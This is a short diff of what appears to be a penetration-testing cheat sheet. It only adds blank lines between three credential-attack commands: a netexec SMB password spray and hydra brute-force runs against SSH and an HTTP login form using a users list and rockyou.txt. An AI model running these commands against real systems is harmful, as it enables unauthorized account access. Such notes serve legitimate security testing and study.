@@ -6,9 +6,11 @@
 ```bash
 netexec smb $IP -u users.txt -p 'Password1' --continue-on-success
 ```
+
 ```bash
 hydra -L users.txt -P rockyou.txt ssh://$IP -t 4
 ```
+
 ```bash
 hydra -L users.txt -P rockyou.txt $IP http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
 ```
